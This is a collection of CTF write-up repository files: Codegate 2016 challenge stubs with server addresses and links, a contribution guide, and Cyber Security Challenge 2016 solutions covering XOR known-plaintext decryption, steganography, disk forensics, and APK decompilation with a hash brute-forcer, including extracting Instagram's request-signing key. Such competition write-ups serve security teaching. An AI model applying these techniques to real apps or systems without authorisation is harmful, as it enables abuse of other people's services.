(TODO)

## Other write-ups and resources

* none yet
# Codegate CTF 2016 : old-school

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> HackerSchool FTZ Level 20
> 
> 
> nc 175.119.158.131 17171
> 
> <http://codegate.bpsec.co.kr/static/files/[1502184fbce57b14b4c7193cea5f2d16](./1502184fbce57b14b4c7193cea5f2d16)>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/CODEGATE/pwnable/oldschool> 
* [Japanese](http://shift-crops.hatenablog.com/entry/2016/03/14/194958)
# Codegate CTF 2016 : serial-444

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> nc 175.119.158.133 23232
> 
> <http://codegate.bpsec.co.kr/static/files/[f158d82c3a24c9de9e560713327b9c7e](./f158d82c3a24c9de9e560713327b9c7e)>


## Write-up

(TODO)

## Other write-ups and resources

* <https://hawaiijohn.wordpress.com/2016/03/15/codegate-2016-serial/> 
* <http://ebfe.dk/ctf/2016/03/21/codegate_quals_serial/>
# Codegate CTF 2016 write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [misc/cemu-512](misc/cemu-512)
* [misc/eocnd-274](misc/eocnd-274)
* [pwn/old-school](pwn/old-school)
* [web/combination-pizza-222](web/combination-pizza-222)
* [web/js-is-no-a-jail](web/js-is-no-a-jail)
* [web/watermelon-210](web/watermelon-210)
* [web/hack-no-jam-365](web/hack-no-jam-365)
* [pwn/BugBug-220](pwn/BugBug-220)
* [pwn/manager-287](pwn/manager-287)
* [pwn/Fl0ppy-315](pwn/Fl0ppy-315)
* [pwn/serial-444](pwn/serial-444)
* [rev/Crypt1nth3sh3ll-333](rev/Crypt1nth3sh3ll-333)
* [rev/compress-200](rev/compress-200)

## Missing write-ups

* [pwn/miccheck-1](pwn/miccheck-1)
* [rev/aarm_encrypt-191](rev/aarm_encrypt-191)
* [rev/ultra-rev-350](rev/ultra-rev-350)
# Codegate CTF 2016 : aarm_encrypt-191

**Category:** Rev
**Points:** 
**Solves:** 
**Description:**

> Decrypt "Encrypted Text"
> 
> 
> ===== Encrypted Text =====
> 
> BLuKJbcqai83,/0h`vvh_monqu"kglgh_soh13dhr/duquu
> 
> ===== End Encrypted Text =====
> 
> â€”â€” Encrypted Hex Code â€”â€”
> 
> 42 4c 75 4b 4a 62 63 71 61 69 38 33 2c 2f 30 68 60 76 76 68 5f 6d 6f 6e 71 75 22 6b 67 6c 67 68 5f 73 6f 68 31 33 64 68 72 2f 64 75 71 75 75 
> 
> â€”â€” End Encrypted Hex Code â€”â€”
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Codegate CTF 2016 : compress-200

**Category:** Rev
**Points:** 200
**Solves:** 
**Description:**

> Compress (rev/200)
> 
> Decode me!


## Write-up

(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88842/?langid=1> 
* <https://github.com/pr0v3rbs/CTF/tree/master/codegate/2016/Compress>
# Codegate CTF 2016 : Crypt1nth3sh3ll-333

**Category:** Rev
**Points:** 
**Solves:** 
**Description:**

> <https://goo.gl/2nLO7Y>


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2852> <https://ctftime.org/writeup/2852> <https://ctftime.org/writeup/2852> <https://ctftime.org/writeup/2852> 
# Codegate CTF 2016 : ultra-rev-350

**Category:** Rev
**Points:** 
**Solves:** 
**Description:**

> You can use command 'ultra_rev'!
> 
> 
> ssh ultra_rev@175.119.158.134 -p11133
> 
> pw : rev
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Codegate CTF 2016 : combination-pizza-222

**Category:** Web
**Points:** 
**Solves:** 
**Description:**

> Combination Pizza (web/222)
> 
> <http://175.119.158.137:9242/f00885da9ad9ad5fcccaa8fc1217e3ae/>
> 
> 
> Shake Shake!!
> 
> <http://175.119.158.137:9242/f00885da9ad9ad5fcccaa8fc1217e3ae/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/03/13/codegate-ctf-2016-web-222-combination-pizza-write-up/>
* <https://ctf.rip/codegate-2016-combination-pizza-web-challenge/> 
# Codegate CTF 2016 : hack-no-jam-365

**Category:** Web
**Points:** 
**Solves:** 
**Description:**

> Hack No-Jam (web/365)
> 
> <http://175.119.158.137:9999/>
> 
> 
> Web hacker is always hungry :(
> 
> <http://175.119.158.137:9999/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.youtube.com/watch?v=ere9HukUJQU>
# Codegate CTF 2016 : js-is-no-a-jail

**Category:** Web
**Points:** 
**Solves:** 
**Description:**

> JS_is_not_a_jail
> 
> nc 175.119.158.131 1129
> 


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/CODEGATE/misc/jsisnotajail> 
* <http://hacktizen.blogspot.in/2016/03/codegate-2016-jsisnotajail.html>
* <https://fadec0d3.blogspot.in/2016/03/codegate-ctf-2016-jsisnotajail-100.html>
# Codegate CTF 2016 : watermelon-210

**Category:** Web
**Points:** 210
**Solves:** 
**Description:**

> Watermelon (web/210)
> 
> Please share your playlist!
> 
> 
> nc 175.119.158.133 9091
> 
> <http://codegate.bpsec.co.kr/static/files/[5d63b69dccbd0d46bcf3e559bf79b4a7](./5d63b69dccbd0d46bcf3e559bf79b4a7)>


## Write-up

(TODO)

## Other write-ups and resources

* <http://r0p.club/2016/watermelon/> 
* <https://hawaiijohn.wordpress.com/2016/03/15/codegate-2016-watermelon/>
* [Japanese](http://shift-crops.hatenablog.com/entry/2016/03/14/194958)
* <https://github.com/pr0v3rbs/CTF/blob/master/codegate/2016/Watermelon/exploit.py>
# Contribution guide

Please take a moment to review this document in order to make the contribution process easy and effective for everyone involved.

## Adding a new write-up entry

1. Each CTF gets its own folder in the root of this repository. For example, ‘Foo Bar CTF 2015’ would get a folder named `foo-bar-ctf-2015`.
2. Every CTF challenge gets its own subfolder within that folder with an appendix indicating its value. For example, all files related to the ‘Foo Bar CTF 2015’ challenge named ‘Sucky sandbox’, which is worth `150` points, would be located in `foo-bar-ctf-2015/sucky-sandbox-150`.
3. Every CTF challenge folder needs a Markdown-formatted `README.md` file, e.g. `foo-bar-ctf-2015/sucky-sandbox-150/README.md`. This file contains any details about the challenge, the main write-up itself, and links to other write-ups and resources. The folder should also contain the source files needed to reproduce the challenge.
4. Once you’re done adding the entry or making your changes, submit a pull request using the GitHub web interface.
5. Finally, make sure you follow our committing rules

## Changing an existing entry

1. Feel free to make any changes you see fit. Add a link to a write-up on your blog, add missing source files, clarify explanations in the write-up, or — if you’ve found a better way to solve a challenge — simplify the existing solution.
2. Once you’re done, submit a pull request using the GitHub web interface.

## Committing rules
These rules exist to keep the repo maintainable and complete. Please consider following them.

1. Update the root `big-ctf/README.md` file, when adding a writeup to `big-ctf/task/`. We have three different sections:
	* `Completed write-ups` - Tasks, for which there is at least one local repo writeup (see the `Write-up` section of each task)
	* `External write-ups only` - Tasks, for which there is at least one external writeup (see the `Other write-ups and resources` section of each task, but no local writeup
	* `Missing write-ups` - Tasks, for which there are no writeups available (yet).
2. If there already exists a writeup in the `Write-up` section and you want to add another local writeup:
	- Add another `Alternative write-up` section above the `Other write-ups and resources` section
3. Do not add files that have a filesize bigger than 15MB to keep the repo relatively small. Upload the file instead to a service or reference it from somewhere else.
4. Consider following these [committing rules](https://atom.io/docs/latest/contributing#git-commit-messages). For this repo, we like to use these [emojis](http://www.emoji-cheat-sheet.com/):
	* :memo: when adding a writeup to the `Write-up` section of a task
	* :floppy_disk: when adding resources for a task, e.g. files or scripts
	* :link: when adding a writeup link to the `Other write-ups and resources` section of a task
	* :pill: when fixing broken links or corrupt Markup stuff
	* :books: when updating the structure of this repo or adding a ctf skeleton structure
	* :fire: when deleting files
5. If you want to add a new CTF directory/structure (skeleton) with as little trouble as possible, then consider using the `genctf.py` tool from [our tools repo](https://github.com/ctfs/write-ups-tools/)
# Cyber Security Challenge 2016: BSOD Quote

**Category:** Cryptography  
**Points:** 15  
**Challenge designer:** Nico Callens  
**Description:**  
> Find the flag in [this file](https://s3-eu-west-1.amazonaws.com/be.cscbe.challenges/Cryptography+-+BSOD+quote+-+Nico+Callens/BSOD.scr).  
> The solution is enclosed between quotes.

## Write-up
A .src (screensaver) file can be unzipped which will return all of the images used in the screensaver.
```
$ unzip BSOD.src
```

Open GIMP, File -> Open as Layers, select all the screensaver images

![start](images/start.png)

Select Tools -> Paint Tools -> Bucket Fill and set the Mode to Color erase.
Now for each of the layers click on the blue background. All of the letters will show and the solution will be visible.

![solution](images/solution.png)

## Other write-ups and resources

# Cyber Security Challenge 2016: In a jiffy

**Category:** Cryptography  
**Points:** 25  
**Challenge designer:** Michiel Meersmans  
**Description:**  
> Someone used this [NSA-approved-backdoor-free encryption program](challenge-source-files/encrypt.py) to encrypt the following [file](challenge-source-files/flag_800x400.gif.enc). Can you decrypt the file and prove it’s not so secure after all?  

**Hints:**
> \#1: <https://www.youtube.com/watch?v=9iafa959JvY>  
> \#2: What's in a name?

## Write-up
We start off by taking a look at the script used for encrypting the file.
The script starts off by generating a random 10 byte key and expands the key to the size of the file that needs to be encrypted by repeating it multiple times.
This expanded key is than used in a simple XOR encryption.

XOR encryptions have the property that if we XOR the ciphertext with the plaintext we’ll get the key. Looking at the file name of the encrypted file it contains “.gif” so it’s pretty safe to assume it’s a GIF image.

Performing a bit more research on the gif format:
<http://giflib.sourceforge.net/whatsinagif/bits_and_bytes.html>
<https://en.wikipedia.org/wiki/GIF#Example_GIF_file>

We learn that a GIF file always starts with a fixed 6 byte header, followed by 2 bytes of width and 2 bytes of height. The width and height are both in the filename too, so now we know the first 10 bytes of the plaintext file. We can XOR these bytes with the encrypted file to figure out the key and decrypt the entire image. The following python script does just that:

```
$ python solve.py
```

![flag](images/solution.png)

# Cyber Security Challenge 2016: This looks random

**Category:** Cryptography  
**Points:** 40  
**Challenge designer:** Daan Raman  
**Description:**  
> There is no way you are solving this challenge - it’s generating random strings of text!

> Note: don’t reverse the executable unless you like pain.  

> The solution is a 9 letter Italian word, all lower case.  
> [The executable](challenge-source-files/you_move_me) is non-harmful and can be run on a UNIX system (compiled on Kali).  

**Hints:**
> Perform a statistical analysis of each line printed, and see if you find a pattern.

## Write-up
If you run the program, it will print out apparently random strings, however, there is a statistical bias in the strings, on the letter A. Their frequency of appearance is linked to the fibonacci sequence.  
The challenge is in some way “solving itself” - it creates random strings until it has found one that matches the number of “A” characters identical to the Fibonacci number at that position in the sequence - so statistically less A’s in the first sentences printed, and more A’s in the later sentences printed. The longer you wait, the clearer the statistical bias will become.

```python
import random, string
import collections

def randomword(length):
   return ''.join(random.choice(string.lowercase) for i in range(length))

arr=[0, 51, 1, 62, 1, 89, 2, 66, 3, 100, 5, 289, 8, 192, 13, 223, 21, 22, 34, 10, 55, 4, 89]
c=0
search_char = "a"

while len(arr) > 0:
   c=c+1
   print str(c) + "\r",
   numbers_char_matched = 0
   stri =  randomword(160)
   str_count = stri.count(search_char)

   if str_count == arr[0]:
	print str(stri)
	arr.pop(0)
	arr.pop(0)

```

If you count the frequency of 'a' in each string you'll notice the fibonacci sequence

```python
>>> import collections
>>> letters = collections.Counter('string')
```

![solution](images/solution.png)

### Solution
fibonachi

*Note: fibonacci sequence = 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, ...  
The string length is only 160 characters which means the frequency of a can only appear 160 times. So after 12 printed strings, the program should stop.*
# Cyber Security Challenge 2016: What did he say?

**Category:** Cryptography  
**Points:** 20  
**Challenge designer:** Sasja Reynaert  
**Description:**  
> Somebody found a high point challenge and tweeted about it, he even gives away a hint!  
[https://twitter.com/HereIsJ0hnny](https://twitter.com/HereIsJ0hnny)  

**Hints:**
> Homoglyph

## Write-up
A Google search for `"twitter homoglyph decode"` points to <http://holloway.co.nz/steg/>. Decoding the [tweet](https://twitter.com/HereIsJ0hnny/status/694255760402976768) text using that tool yields the solution.

![solution.png](images/solution.png)

### Solution
bazinga
# Cyber Security Challenge 2016: Where's Waldo?

**Category:** Cryptography  
**Points:** 40  
**Challenge designer:** Cédric Bassem  
**Description:**  
> Waldo has really outdone himself this time! [Can you find him?](challenge-source-files/whereswaldo.bpm)  

**Hints:**
> Waldo is well hidden within the image

## Write-up
Waldo is hidden within the above image by using an image steganography technique called LSB steganography. With least significant bits steganography (LSB), data is hidden within an image by altering the least significant bit of each byte. For a BMP file using a 24 bit color representation, each color is represented by three bytes, one for every base color in RGB. Changes in the LSB of every byte have minimal impact on the color and are indiscernible to the human eye.  

One way of detecting LSB steganography is by enhancing the LSB values of that image. The below image shows an LSB enhancement of the above image. We notice the following odd pattern. 

![screenshot](images/ss.png)

Extracting the information is performed by extracting every LSB value from every color.  
The below python code does this. 

```python
from PIL import Image  
  
im = Image.open("encoded.bmp")  
pix = im.load()  
width, height = im.size  
  
extracted_bits = []  
for y in range(height):  
    for x in range(width):  
	        r, g, b = pix[(x,y)]  
	        extracted_bits.append(r & 1)  
	        extracted_bits.append(g & 1)  
	        extracted_bits.append(b & 1)  
	  
	extracted_byte_bits = [extracted_bits[i:i+8] for i in range(0, len(extracted_bits), 8)]  
	with open("secret.bmp", "wb") as out:  
	    for byte_bits in extracted_byte_bits:  
	                byte_str = ''.join(str(x) for x in byte_bits)  
	        byte = chr(int(byte_str, 2))  
	        out.write(byte)
```

In this case the hidden message was a BMP image

![onedoessimplynot](images/extracted.bmp)

Which contained another LSB hidden image. With FLAG: UHcUbUz5omz5lZKS4pzr

![flag](images/extracted2.bmp)
# Cyber Security Challenge 2016: Are you worthy?

**Category:** Digital Forensics  
**Points:** 100  
**Challenge designer:** Sasja Reynaert  
**Description:**  
> An investigation is ongoing on the murder on Peter Hardman. After eyewitnesses mentioned a fight going on between Peter and John Smith, the police took a forensic copy from John Smith’s computer. 
One of his mails confirmed there was a fight between Peter and John, however it didn’t proof John murdered Peter. Show us you are a worthy forensic examiner and give us the advice that was given by mail.

>Hint(s)
>- Find the browsing activity
>- I cleared EVERYTHING!?

[File](https://s3-eu-west-1.amazonaws.com/be.cscbe.challenges/Digital+Forensics+-+Are+you+worthy+-+Sasja+Reynaert/AreYouWorthy.E01) (This file is +8GB)
## Write-up
####Step 1: Find the e-mail
- After mounting the .E01 file, the files can be browsed through. An Outlook Data File (.ost) can be found in the `users\john\appdata\local\microsoft\outlook` folder, the mail to be found is PGP encrypted. Extra investigation is needed to decrypt the file.

![image1](images/img24.jpg)

####Step 2: Find the private PGP key
A private PGP key is located at `C:\Users\john\Documents\private\eidHEaeizREofISzendJOepdHNanvNY02.asc`. The password is still needed to decrypt the mail. Since we need to find more information to decrypt the mail, extra artifacts must be investigated.

![image1](images/img26.jpg)

####Step 3: Investigate browser history
In the Google Chrome browser history there are traces of searches to steganography. The two sites that are of interest are:

- https://futureboy.us/stegano/decinput.html
- https://futureboy.us/stegano/decode.pl

![image1](images/img28.jpg)

####Step 4: Find the image with hidden information
In the Recycle.Bin folder there are a few deleted files. With e.g. FTK, an image called $RGD43NM.jpg can be found. The name of the file can be seen with the RecBin tool (locked.jpg). Once decoded with the above mentioned sites, it will give the password to decrypt the PGP encrypted mail which was found earlier.
password: this_is_definitely_not_the_password_you_are_looking_for

![image1](images/img41.jpg)

####Step 5: Decrypt the PGP encrypted e-mail
With the mailvelope plugin in Chrome or Firefox it is easy to import the private key and decrypt the e-mail without the need of additional tools.
The solution to this challenge is: “Whenever I’m sad, I stop being sad and be awesome instead.” (without quotes)

![image1](images/img42.jpg)


##Solution
"Whenever I’m sad, I stop being sad and be awesome instead."


## Other write-ups and resources

# Cyber Security Challenge 2016: Caught before the drug deal


**Category:** Digital Forensics   
**Points:** 100  
**Challenge designer:** Annika ten Velden  
**Description:**  
> During a raid of the police as an attempt to catch a huge narcotics gang, the police confiscated a computer of Charlotte May. She is suspected of helping setting up different drug deals. 
Communication found on this computer proved the existence of a next drug transfer. Can you find the transfer code of the next deal?

[File Here](https://s3-eu-west-1.amazonaws.com/be.cscbe.challenges/Digital+Forensics+-+Caught+before+drug+deal+-+Annika+ten+Velden/CaughtBeforeDrugDeal.E01) (9GB)

>Hints:

> - E-mail is not the only communication type existing
> - When a file gets deleted, some parts remain visible on a system

## Write-up
- Step 1 - mounting the e01 file with e.g. FTK imager  
A first examination of the image shows the computer is recently installed. Not a lot of files are found on it and only a few applications are installed. At first sight we see that there are a few possibilities to communicate with other people: Outlook, Internet, TeamViewer and Skype.

- Step 2 - going through e-mail  
In the Users\Charlotte\AppData\Local\Microsoft\Outlook folder we see an .ost file of Charlotte May. Opening this file with eg. Kernel OST viewer shows us a lot of mails. Going through the mails, all mail seems to be subscription requests and cancellations. No e-mail with real conversation was found.

![image1](images/image1.png)

- Step 3 – going through Skype history  
When looking in Users\Charlotte\AppData\Roaming\Skype\live#3acharlotte.may1989 no main.db file was found.

![image2](images/image2.png)

The main.db is the database where all Skype history is kept. When exploring the recycle bin we see that there is a .db file. When viewing this with RecBin, it shows that this was a deleted main.db file. After recovering the deleted file and renaming it to main.db, it is possible to read it with eg. SkypeLogView.

![image3](images/image3.png)
![image4](images/image4.png)

When looking at the recovered Skype history a conversation was found between Charlotte and John about a deal that is held in February. John sends a file, called Details.docx, to Charlotte with the details of it. Charlotte also confirms the file will be destroyed after reading it.

![image5](images/image5.png)

- Step 4 – examining browser history  
Examining browser history of the installed browsers shows that some browsing was done. A local file, called Detailed.docx can be found that was located in the Skype Received Files folder.

![image6](images/image6.png)

- Step 5 – finding the file  
The folder where the Details.docx file was located, seemed to be cleared. We also see that sdelete.exe and CCleaner.exe was downloaded which seems to be an indicator that the file was securely wiped.  
A good forensic examiner does not give up this quickly, but thinks about where information could still exist. Based on this, looking at the thumbcache can maybe be helpful.  

Opening the Users\Charlotte\AppData\Local\Microsoft\Windows\Explorer\thumbcache_256.db shows different thumbnails. A thumbnail of a Word document was found where we can see “Confidential” written on the page. Below the “Confidential” we can read the transfer code “T162-BE8829/BRU9102883” which is the solution to this challenge.

![image7](images/image7.png)

##Solution
T162-BE8829/BRU9102883
## Other write-ups and resources

# Cyber Security Challenge 2016: exFat is not Fat

**Category:** Digital Forensics  
**Points:** 90  
**Challenge designer:** Yves Vandermeer  
**Description:**  
> Recover deleted file \fccu\logo.jpg on the provided forensic copy and provide the md5 hash value.

>Hint: Use FAT chaining

## Write-up
-	All exFAT values are encoded using “little-endian”. You can use any hex editor to solve this challenge.
-	Analyse the forensic image and discover that it is one exFAT partition (TSK fsstat is helpful if wanting to avoid manual decoding) : Cluster size = 1024 bytes (2 sectors) FAT starts at sector 128 (962 sectors in total)
-	Search into the volume for the unallocated entry “logo.jpg” into FCCU folder. The entry starts at offset 125.424.288.
-	First byte of the entry “0x05” means “first 32 bytes set for an unallocated entry” (a used entry should start with “0x85).
-	Second bytes “0x02” indicate how many “32 bytes set” sub-entries are following to document this file
-	Next “32 bytes”, starting with “0x40” are describing the file allocation. This is what we need to recover file content. (should be starting with “0xC0” If still allocated).
-	Second byte “0x01” indicates that the “FAT” is used to keep the chaining. The file is probably fragmented. At offset 0x14 relative to this sub-entry, the Dword value points to the first cluster containing file data, and offset 0x18 Dword provides file length.
-	The work is now to follow the cluster chain using the FAT (every cluster is represented by a 4 bytes value, containing next chained clusters or, for the last one 0xFFFFFFFF.
-	Having list of clusters and file size, a combination of several “dd” commands deliver the file and allows to compute the hash value for the solution.

##Solution
41aeeec732ab724a53178620fddd6fbf

## Other write-ups and resources
- Mount on windows
- Use recuva
# Cyber Security Challenge 2016: Only 2 sectors can lead to a criminal

**Category:** Digital Forensics  
**Points:** 60  
**Challenge designer:** Yves Vandermeer  
**Description:**  
> Analyse provided NTFS MFT record and compute MD5 checksum for the file content.

[File Here](challenge-source-files/FCCU_A.dd)

>Hint: You want the flag but you can’t seem to get it, maybe you need a fixup?

## Write-up
- Note that all values read in a NTFS MFT record are little endian encoded.
- Looking to the provided file with xdd command, we can see “FILE” in the header. This means the file is an NTFS MFT record.

![screen](images/image1.png)

- As we are looking for file content, we have to locate $DATA attribute. A $DATA attribute is always starting with byte sequence 0x 80 00 00 00 then followed by a DWord for the attribute length (little endian)
- We can identify the $DATA attribute at offset 416 (0x01A0) and the attribute length is 120 bytes (0x00000078).
- Byte at offset 0x08 relative to the attribute is used to indicate if the file content is non resident (0x01) or resident (0x00). In this case the value is 0x00, meaning that the content is resident, included into the MFT record
- Offset 0x10 relative to the attribute indicate the length of content ( 4 bytes) and offset 0x14 indicate the offset of content into the attribute ( 4 bytes). In this case resident file content start at offset 0x18 + 0x01A0, 0X1B8 and is 90 bytes length (0x5A).
- Before extracting content, we have to be aware that for “security reasons” NTFS replace every 510 and 511 bytes of each MFT record sector by using a so called “fixed array” of values. At MFT record offset 0x04 a word point to the fixed array (0x30 here) , immediately followed at offset 0x06 by a word describing how many 2 byte entries are in the array (in this case 0x03)
- Thus, we need to replace the bytes 510 and 512 by the first “real value” in the fixed array.
- Fixed array starts at 0x30 with the “fixed 2 byte mask”, equal to the bytes stored so fat at offsets 510 and 511 : “04 00”. They need to be replaced by first 2 byte entry: “33 37”. 
- It is now time to extract file content (90 bytes from offset 0x1B8) into a real text file and to compute hash value to get the solution.

##Solution
1fc720433f6eca2e298f65efec695aaa

## Other write-ups and resources
# Cyber Security Challenge 2016: Rebuild the hidden picture

**Category:** Digital Forensics  
**Points:** 30  
**Challenge designer:**  Yves Vandermeer  
**Description:**  
> Provide MD5 hash value for the JPEG picture file hidden by a suspect in [this file](this-file-challenge-source-files/FCCU_E.dd)
>
Note: Criminals are known to mess with their files to make your life harder, avoid the blocks that they tried to wipe.

> Hints: 
> - Use file type headers
> - Use file type trailers

## Write-up
- Use foremost to extract the image:  

`foremost -t jpeg,png FCCU_E.dd`

Once we open the image, we can see that it is not prefect. a simple xdd command shows “blocks” of zeroes. A deeper search show that “Zeroed” blocks are at sector 3000 (3000 sectors), and 9000 (3000 sectors).

It’s now time to extract only “good” sectors and avoid zeroed ones. Something like :

```
dd if=test.jpg count=3000 > result.jpg  
dd if=test.jpg count=3000 skip=6000 >> result.jpg
dd if=test.jpg count=3562 skip=12000 >> result.jpg
```
Computing md5 on result.jpg file gives the answer

##Solution
221fda8d1e083526038c6e1fa82d49f6

## Other write-ups and resources
# Cyber Security Challenge 2016: Phishing is not a crime

**Category:** Mobile Security  
**Points:** 100  
**Challenge designer:** Jeroen Beckers
**Description:**
> Can you get into Dexter's laboratory?

[Application file](challenge-source-files/dexter.apk)

## Write-up
When launching the application, you see a countdown going from 60 to 0, an input field and a submit button. Let's see what this application does:

Unzip the APK, Dex2jar the embedded “classes.dex” file and decompile the resulting JAR back to java code:
```
$ unzip dexter.apk
  Archive:  dexter.apk
    inflating: AndroidManifest.xml     
    extracting: assets/app.apk          
    inflating: assets/classes.dex      
    inflating: assets/classes_original.dex  
    (…)
$ ./d2j-dex2jar.sh classes.dex
    dex2jar classes.dex -> ./classes-dex2jar.jar
```
We can then decompile and view the .jar using JD-GUI. The application flow of the MainActivity class can be described as follows:
1. It downloads an APK file from `/chall.php` and saves it as tf2.apk
2. It extracts the tf2.apk file and loads the contained classes.dex file
3. When submitting a code, the application first verifies the code using the `open()` method loaded from the external classes.dex file
4. If the code is correct, it submits this code to the webserver by calling `sol.php?key=" + paramString1 + "&id=" + paramString2`
5. When 60 seconds are over, a new APK is requested from the server.

Two things still need to be figured out: What is the `id` parameter, and how does the `open()` method work. The id parameter can be found by looking at the FileDownloader class:
```java
public static void downloadFile(String paramString, File paramFile)
  {
    int i;
    for (;;)
    {
      try
      {
        Object localObject = (HttpURLConnection)new URL(paramString).openConnection();
        ((HttpURLConnection)localObject).connect();
        paramString = ((HttpURLConnection)localObject).getInputStream();
        paramFile = new FileOutputStream(paramFile);
        ((HttpURLConnection)localObject).getContentLength();
        String str = ((HttpURLConnection)localObject).getHeaderField("Content-Disposition");
        if ((str != null) && (str.indexOf("=") != -1))
        {
          id = str.split("=")[1];
          id = id.split("\\.")[0];
          id = id.split("\"")[1];
          time = Date.parse(((HttpURLConnection)localObject).getHeaderField("Date")) / 1000L;
          localObject = new byte[1048576];
          i = paramString.read((byte[])localObject);
          if (i <= 0) {
            break;
          }
          paramFile.write((byte[])localObject, 0, i);
          continue;
        }
        Log.d("dexter", "ID IS NULLL");
      }
      catch (Exception paramString)
      {
        failed = true;
        return;
      }
    }
    Log.d("dexter", "Written file! bytes = " + i);
    paramFile.close();
  }
  ```
We can see that the ID is actually the filename of the downloaded APK file, without the .apk extension. The next step is to get a hold of a loaded APK file, which can easily be done by surfing to /chall.php and saving the generated file. Using the same decompilation steps as before, we can see the following code:

```java
public static boolean open(String paramString)
  {
    if (paramString.length() != 10) {}
    for (;;)
    {
      return false;
      if ((paramString.substring(0, 2).equals("2b")) && (paramString.charAt(2) == '8') && (new StringBuilder(paramString).reverse().toString().substring(4, 7).equals("72f"))) {}
      try
      {
        MessageDigest localMessageDigest = MessageDigest.getInstance("SHA1");
        localMessageDigest.reset();
        localMessageDigest.update(paramString.getBytes(Charset.forName("UTF8")));
        boolean bool = "50566615ff8e8e8eec6e8d60539dd4eb6f44a1ad".equals(new BigInteger(1, localMessageDigest.digest()).toString(16));
        if (!bool) {}
      }
      catch (NoSuchAlgorithmException paramString)
      {
        for (;;)
        {
          paramString.printStackTrace();
        }
      }
    }
    return true;
  }
  ```
There are two parts to this small method. First, some static checks are occuring. In the example above, the following conditions have to be met:
1. The key length is 10
2. The first two characters needs to be "2b"
3. The third character needs to be "8"
4. Characters 4 to 6 need to be f27

Next, the SHA1 hash of the key has to equal a given string, in this case `50566615ff8e8e8eec6e8d60539dd4eb6f44a1ad`. As there is no more information available, we will need to brute-force this. If we download a few more generated APK files, we'll see that the characters change in every APK, but also that sometimes MD5 is used instead of SHA1. All of the characters do fall in the hex range, so it would be a good guess to only bruteforce the four remaining characters in the [0-9A-F] range. 

The following python script solves the challenge by extracting all the conditions and bruteforcing the hash:

```python
import subprocess, os, re, hashlib, time
import urllib2
import shlex
from subprocess import Popen, PIPE

def get_exitcode_stdout_stderr(cmd):
    """
    Execute the external command and get its exitcode, stdout and stderr.
    """
    args = shlex.split(cmd)

    proc = Popen(args, stdout=PIPE, stderr=PIPE)
    out, err = proc.communicate()
    exitcode = proc.returncode
    #
    return exitcode, out, err

def getFlag(key, id):
  url = 'http://dexter.challenges.cybersecuritychallenge.be/sol.php?key=%s&id=%s' % (key, id)
  response = urllib2.urlopen(url)
  print response.read()

def getValue(str, text):

  regex = re.search(str, text, re.IGNORECASE)

  if regex:
    return regex.group(1)

  print "ERROR: %s not found!" % str

  return ""

def solve():
  FNULL = open(os.devnull, 'w')

  exitcode, str, err = get_exitcode_stdout_stderr(" ".join(["rm", "-rf", "./unpacked"]))

  exitcode, str, err = get_exitcode_stdout_stderr('wget --server-response -q -O vault.apk "http://dexter.challenges.cybersecuritychallenge.be/chall.php"')
  filename = getValue('"(\w*).apk', err);
  exitcode, str, err = get_exitcode_stdout_stderr(" ".join(["apktool", "d", "-f", "./vault.apk", "-o", "./unpacked"]))

  cmd = "grep const ./unpacked/smali/be/nviso/vault/Vault.smali"
  exitcode, str, err = get_exitcode_stdout_stderr(cmd)

  #fdff675780 fd 102 76f 67 SHA1 3093eb9177eacd03224c036cc7396ddeb095a9b2 6b63f8ad18c31f5b7344a5450c94a3f4 1453878508 56a86cec

  
  ALGO = getValue('const-string v3, "([^"]*)"', str)
  part1 = getValue('const-string v0, "([^"]*)"', str)

  part2 = getValue('const/16 v1, (.*)', str)
  part2 = int(part2, 16)

  part3 = getValue('const-string v2, "([^"]*)"', str)

  HASH = getValue('const-string v5, "([^"]*)"', str)

  partialSolution = part1 + chr(part2) + part3[::-1]


  hexchars = "abcdef0123456789"

  for a in hexchars:
    for b in hexchars:
      for c in hexchars:
        for d in hexchars:

          potentialSolution = partialSolution + a + b + c + d

          m = hashlib.new(ALGO)
          m.update(potentialSolution)
          h = "%s" % m.hexdigest()
          
          if h == HASH:
            return potentialSolution, filename, ALGO

  print "NO JOY"

sol, filename, algo = solve()
getFlag(sol, filename)

```



## Solution
DeeDeeGetOutOfMyL4Borat0ry!

## Other write-ups and resources
- None yet.

# Cyber Security Challenge 2016: Phishing is not a crime

**Category:** Mobile Security  
**Points:** 50  
**Challenge designer:** Arne Swinnen  
**Description:**
> Can you phish the key that the Instagram for Android mobile application APK v7.9.0 is using to sign outgoing JSON data in the signed_body POST parameter? 
> 
> Hint: I love my scrambled egg in the morning!

[Application file](https://github.com/NVISO-BE/CSCBE2016-Challenge-Writeups/blob/master/Mobile%20Security/Phishing-is-not-a-crime/challenge-source-files/com.instagram.android_7.9.0-16288123_minAPI14.apk)

## Write-up
Visiting the author's latest blogpost highlights the method he took in the past to extract the key: https://www.arneswinnen.net/2016/02/the-tales-of-a-bug-bounty-hunter-10-interesting-vulnerabilities-in-instagram/
- Unzip the APK, Dex2jar the embedded “classes.dex” file and decompile the resulting JAR back to java code:
```
$ unzip -d instagram_apk com.instagram.android_7.9.0-16288123_minAPI14\(armeabi-v7a\)\(nodpi\).apk
Archive:  com.instagram.android_7.9.0-16288123_minAPI14(armeabi-v7a)(nodpi).apk
    inflating: instagram_apk/META-INF/MANIFEST.MF  
    inflating: instagram_apk/AndroidManifest.xml  
    inflating: instagram_apk/LICENSE.txt  
    inflating: instagram_apk/META-INF/CERT.RSA  
    (…)
$ dex2jar classes.dex 
    this cmd is deprecated, use the d2j-dex2jar if possible
    dex2jar version: translator-0.0.9.15
    dex2jar classes.dex -> classes_dex2jar.jar
    Done.
```
- Decompiling the jar with the JD-GUI tool and searching for the string “Signature” yields an interesting result:

![image1](images/image1.png)

